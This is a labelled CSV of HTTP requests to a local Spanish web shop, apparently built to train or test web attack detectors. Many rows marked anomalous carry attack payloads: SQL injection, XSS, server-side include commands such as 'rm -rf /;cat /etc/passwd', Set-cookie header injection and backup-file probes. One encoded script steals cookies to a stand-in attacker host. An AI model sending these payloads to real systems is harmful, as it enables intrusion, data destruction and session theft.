query,label
http://localhost:8080/tienda1/imagenes/cmenbul.gif.inc HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27INJECTED_PARAM HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=4564&B1=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yarosh&password=es137z7ble&nombre=Ian&apellidos=Bardina+Servi%E0&email=alissa_macmillian%40soyandaluz.sl&dni=28316047B&direccion=Avda.+Conde+De+Halcon%2C+127+7%3FA&ciudad=Moral+de+la+Reina&cp=49311&provincia=Lleida&ntc=9933609390542119%257C&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gunn&password=D88Ino&nombre=Nuncia&apellidos=Badell+Macia&email=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&dni=09955823C&direccion=C%2F+Closa+De+Torroja+S%2FN+12-B&ciudad=Loiu&cp=12580&provincia=Asturias&ntc=9649891877150082&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6543&B1=Confirmar%2F HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=81&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2B HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=grz%3F%2Fegore*3&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cp=49333&provincia=Burgos&ntc=5510588122545598&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
idA=1,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=10&B1=A%F1adir+al+carrito,0
http://localhost:8080/_private/ HTTP/1.1,1
modo=registro&login=whitaker7&password=bullanguera&nombre=Ricardina&apellidos=Cusquisiban+Ocifuente&emailA=greenleaf.garcia%40lodgemadrid.np&dni=09092887K&direccion=Avenida+Santa+Marina+39%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=34219&provincia=Palencia&ntc=2461453971721816&B1=Registrar,1
modo=entrar&login=boehlke&pwd=retah%EDla&remember=off&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9683&B1=Confirmar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&cantidad=71&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
idA=2,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=9111&B1=Confirmar HTTP/1.1,1
B2=Vaciar+carrito,0
modo=registro&login=prewitt&password=ma2o4esa&nombre=Aricel&apellidos=Romaguer&email=mirel-duvitski%40pavimentosalagon.sr&dni=38449362D&direccion=Alcalde+Isidoro+Enciso%2C+100+6%3FG&ciudad=Tolox&cp=28850&provincia=C%E1diz&ntc=5111638071636143&B1=Registrar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/asf-logo-wide HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=Asad&apellidos=Tarraubella+Grajera&email=seward_sepulvede%40promotorareina.bt&dni=577B80594V&direccion=Cuesta+Del+Mercadillo%2C+30+&ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif.BAK HTTP/1.1,1
http://localhost:8080/tienda1.Bak HTTP/1.1,1
http://localhost:8080/tienda1/publico.old HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=964&B1=Pasar+por+caja HTTP/1.1,0
id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=21&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rhetta&password=4354c07a&nombre=Cenobia&apellidos=Pertusa+Boladera&email=ripley_kapianidze%40reidesa.net&dni=15821726A&direccion=C%2F+Granada+40%2C+1%3FG&ciudad=Millares&cp=34829&provincia=Valencia&ntc=4815643958728547&B1=Registrar HTTP/1.1,0
B2=Vaciar+carrito,0
modo=registro&login=antinucc&password=zullarse&nombre=Jos%E9+Mar%EDa&apellidos=Rodrigo+Ambr%F3s&email=leibman%40softstylestudio.be&dniA=90993097Z&direccion=Urbanizacion+Residencial+Ronda+36+9%3FB&ciudad=Riells+i+Viabrea&cp=42150&provincia=Teruel&ntc=9974355200418178&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,1
modo=%4040&login=ada&pwd=desmocadero&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&login=boschin&password=3189p6zada&nombre=Amadis&apellidos=Funes+Port%E9s&email=gracie%40triplectextil.me&dni=81791661G&direccion=Carrer+Pica+D%27estats+113%2C+1%3FD&ciudad=Pedrosillo+de+los+Aires&cp=03345&provincia=Guadalajara&ntc=1272948221132397&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp.inc HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1888&B1=Confirmar HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
modo=registro&login=tahsin&password=desempulgadura&nombre=Angilberto&apellidos=Urruch%F9a+Comallonga&email=monkman%40encuentrodominios.org&dni=45054784S&direccion=Paseo+Canteras+75+&ciudad=Cartaya&cp=05198&provincia=Vizcaya&ntc=3616118295208716&B1=Registrar,0
http://localhost:8080/tienda1/global~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp/6909030637832563290.jsp.bak HTTP/1.1,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=44&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=khariton&pwd=enanzar&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helma&password=92H126nA&nombre=Francisco+de+Borja&apellidos=Sofra+Galcer%E1n&email=mizell%40x2.com.vu&dni=61328646C&direccion=Parc+De+La+Budellera%2C+3%2C+4-B&ciudad=Monteagudo+de+las+Vic.ar%EDas&cp=43421&provincia=Huesca&ntc=0417370510264127&B1=Registrar HTTP/1.1,1
modo=entrar&login=lupien&pwd=0ap7r344c6&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
id=1&nombre=Vino+Rioja&precio=100&cantidadA=34&B1=A%F1adir+al+carrito,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
modo=entrar&login=sookdeo&pwd=evacuaci%F3n&remember=on&B1=Entrar,0
modo=entrar&login=chihchie&pwd=s927r%ED9i0o&remember=off%2F&B1=Entrar,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1.bak HTTP/1.1,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=12&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=24%27INJECTED_PARAM&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=sena&password=Mata_3OLvO&nombre=Rut&apellidos=Valiente+Mu%F1umer&email=lanyon_guerrasio%40automovilesalhambra.um&dni=97238430L&direccion=Calle+Granada%2C+85+&ciudad=Monistrol+de+Calders&cp=10140&provincia=Le%F3n&ntc=9959544300389605&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&B1=Pasar+por+caja HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
B2A=Vaciar+carrito,1
modo=entrar&login=wilfrid&pwd=conmover&remember=on&B1=Entrar,0
B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/imagenes/2.gif.inc HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidadA=97&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=943&B1=Confirmar%2F HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=kwei-san&password=hem.at%EDe&nombre=Curt&apellidos=Esposito+Carrizales&email=lindberg_loeb%40showcars.com.name&dni=18724470D&direccion=Plaza+Lima+196%2C+5-B&ciudad=Nu%E9valos&cp=49211&provincia=Cuenca&ntc=1654589375265367&B1=Registrar HTTP/1.1,1
modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&precio=2794&B1=Confirmar,1
http://localhost:8080/ HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.gif.bak HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39%2F&cantidad=19&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
B2=Vaciar+carritoSet-cookie%253A%2BTamper%253D1041264011025374727,1
modo=registro&login=strauss&password=manirrota&nombre=Dania&apellidos=Alc%E1ce.%2Br&email=everrett%40fernandosoto.zr&dni=34016342D&direccion=Doctor+Gomez+Ulla%2C+7+13B&ciudad=Boada+de+Campos&cp=45573&provincia=Tarragona&ntc=9293437709151698&B1=Registrar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=98&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
idA=1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico%27OR%27a%3D%27a&precio=85&cantidad=4&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
modo=entrar&login=general&pwd=cAPRIFOli%C1CeA&rememberA=on&B1=Entrar,1
modo=registro&login=chukwuem0&password=1R0MEntIcI2&nombre=Yesenia&apellidos=Mont+Olascoaga&email=laffan%40phd-photodecor.bv&dni=84304826M&direccion=Carlos+Tomas+Romero+130+&ciudad=Muras&cp=15911&provincia=Valladolid&ntc=4890165807728190&B1=Registrar,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
modo=registro&login=mccarron&password=revistero&nombre=Adelqui&apellidos=Valente+Sanchis&email=gargen%40007tv.zw&dni=83296238J&direccion=C%2F+Fuente+Morena%2C+146%2C+&ciudad=Rillo&cp=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&provincia=Lleida&ntc=3359754319393302&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=barnhill&password=TeN.TAR&nombre=Quintilio&apellidos=Naharro&email=vitola%4023horas.ad&dni=38980059G&direccion=Calle+Isis%2C+180+&ciudad=Lapa%2C+La&cp=45810&provincia=Zaragoza&ntc=6172398321911966&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
modo=registro&login=barnhill&password=TeN.TAR&nombre=Quintilio&apellidos=Naharro&email=vitola%4023horas.ad&dni=38980059G&direccion=Calle+Isis%2C+180+&ciudad=Lapa%2C+La&cp=45810&provincia=Zaragoza&ntc=6172398321911966&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=92%3F&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4594&B1A=Pasar+por+caja HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
errorMsg=Credenciales+incorrectasany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
modo=entrar&login=dasie&pwd=eS518l132n&remember=on&B1=Entrar,0
id=2&nombre=Queso+Manchego&precio=85&cantidad=0&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ciochon&password=sonOrAmente&nombre=Hecilia&apellidos=Grandia+Zarzosa&email=ann-margaret%40indorec.pro&dni=26707809W&direccion=Pasaje+Santo+Angel%2C+190%2C+&ciudad=Aldea+del+Fresno&cp=16522&provincia=Zaragoza&ntc=0399278648684869&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=%27+DELETE+FROM+USERS&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar HTTP/1.1,1
modoA=entrar&login=klapper&pwd=GuSTosA&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alberta&password=BabucherA&nombre=Bryan&apellidos=Planes+Fonterosa&email=beecher%40mailboxrussia.gu&dni=23978164C&direccion=Calle+Juan+De+Uceda%2C+180%2C+&ciudad=Colera&cp=19243&provincia=Burgos&ntc=5730165780562734&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/samples/isapi/favlist.htm HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
modo=registro&login=emdin-sp2&password=649bonata5&nombre=Belkis&apellidos=Boget+Brufau&email=midler.scarpa%40mtos.gs&dni=18121520G&direccion=Tercio+De+Napolitanos%2C+104+4-B&ciudad=Alconchel&cp=17179&provincia=Navarra&ntc=8928022470323777&B1=Registrar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A HTTP/1.1,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=39&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schlacht&pwd=43s8a&rememberA=off&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=corless&pwd=4958el%EDsimo&remember=on%2F&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
modo=registro&login=sood&password=4%2Cang%2Cel%EDn&nombre=Alessandra&apellidos=Urioste+Bohigas&email=rasmussen.ludlam8%40easyviaggio.pw&dni=91389293N&direccion=Calle+Andaluziako+Komunitatea%2C+156+9%3FG&ciudad=Hu%E9neja&cp=05358&provincia=Baleares+%28Illes%29&ntc=5011039662886040&B1=Registrar,1
modo=registro&login=eleni&password=DE5pe%F1AdurA&nombre=Zahira&apellidos=Monteoliva+Pag%E8s&email=stimson_holbrook%40cementosanfranq.ly&dni=02005072R&direccion=Vicari+Joan+Catany+123+1%3FC&ciudad=Y%E9sero&cp=42172&provincia=Badajoz&ntc=3547056406235223&B1=Registrar,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp.BAK HTTP/1.1,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%252B&precio=1784&B1=Pasar+por+caja HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zureik&password=concurrente&nombre=Lino&apellidos=Barea+Runke&email=schulz%40hiperbarcelona.hn&dniA=64105812M&direccion=Camoe%2C+189%2C+&ciudad=Olv%E9s&cp=03579&provincia=Guip%FAzcoa&ntc=6282081679981232&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp.bak HTTP/1.1,1
B2=%7C,1
http://localhost:8080/tienda1/index.jsp/asf-logo-wide.gif HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
errorMsg=Credenciales+incorrectas%27INJECTED_PARAM,1
http://localhost:8080/tienda1/global.INC HTTP/1.1,1
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/samples/htmlsamp/tables.htm HTTP/1.1,1
modo=registro&loginA=sena&password=Mata_3OLvO&nombre=Rut&apellidos=Valiente+Mu%F1umer&email=lanyon_guerrasio%40automovilesalhambra.um&dni=97238430L&direccion=Calle+Granada%2C+85+&ciudad=Monistrol+de+Calders&cp=10140&provincia=Le%F3n&ntc=9959544300389605&B1=Registrar,1
idA=1,1
id=1,0
http://localhost:8080.Inc HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
modo=registro&login=suzie&password=*694a47ndiL&nombre=Tubal&apellidos=Escaler+Astorquiza&email=seiter.segev%40mataluenga.bs&dni=14298138G&direccion=Fidelio+5+&ciudad=Boada&cp=03134&provincia=La+Rioja&ntc=7362218101347433&B1=Registrar,0
modo=registro&login=erdem&password=veRd7ma3&nombre=Zinedine&apellidos=Terzano+Revert%E9&email=%257C&dni=58018464K&direccion=C%2F+Alondra%2C+134%2C+10%3FC&ciudad=Pu%E9rtolas&cp=33070&provincia=Guadalajara&ntc=4378749164701036&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
id=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Vino+Rioja&precio=100&cantidad=82&B1=A%F1adir+al+carrito,1
modo=insertar&precio=6188&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6721&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
idA=1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lendon&pwd=silici0&remember=on&B1A=Entrar HTTP/1.1,1
modo=entrar&login=marchell&pwd=agra&rememberA=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krowlek&pwd=13%2F7I6a7&remember=off&B1=Entrar HTTP/1.1,1
http://localhost:8080.old HTTP/1.1,1
modo=entrar&login=cybotech&pwd=escobado&remember=off&B1=Entrar,0
modo=entrar&login=mikel&pwd=atrazar&remember=off&B1=Entrar,0
modo=insertar&precio=4220&B1=Pasar+por+caja,0
id=2&nombreA=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=qinghui&password=disterminar&nombre=Nadra&apellidos=Busquets+Baduell&email=lillo_funk%40inoxled.ma&dni=22652909W&direccion=C%2F+Codigo+Correspondencia+Oficial+Correos-telegrafos%2C+42+13-B&ciudad=Peralta+de+Alcofea&cp=47814&provincia=V%2Biz%2Bcaya&ntc=5583449016514744&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
modo=entrar&login=dokken8&pwd=PaRLaNch%EDn&remember=off%2F&B1=Entrar,1
id=1%27INJECTED_PARAM,1
modo=registro&login=veriee&password=zabalm*edina&nombre=Septimo&apellidos=Juanico+Castro&emailA=fleming_sayce%40miami-beach.com.kz&dni=44614622G&direccion=C%2F+Minerva%2C+177%2C+1-C&ciudad=Vi%F1uelas&cp=22280&provincia=Palencia&ntc=3985053598089908&B1=Registrar,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
modo=registro&login=jamaly&password=6ho7rca5U16&nombre=Di%F3scoro&apellidos=Alentorn+Etayo&email=anz1%40hiperbilbao.fj&dni=76971829Y&direccion=Calle+Perez+Galdos+193%2C+&ciudad=Cortegada&cp=39750&provincia=Zaragoza&ntc=8812117919949504&B1=Registrar,0
id=2&nombre=Vino+Rioja%252B&precio=100&cantidad=86&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4296&B1A=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
modo=registro&login=slaby&password=3a91io&nombre=Niseas&apellidos=Paiva+Romera&emailA=owens%40provider.com.br&dni=74056042K&direccion=Aigua+Marina+91%2C+&ciudad=Chercos&cp=40421&provincia=Segovia&ntc=8044294456559903&B1=Registrar,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
http://localhost:8080/tienda1/publico/vaciar.jsp/4861362529278789730 HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=seipue&pwd=b*uba&remember=off&B1=Entrar HTTP/1.1,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=58&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%3F&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8865&B1=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
B2=Vaciar+carrito%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
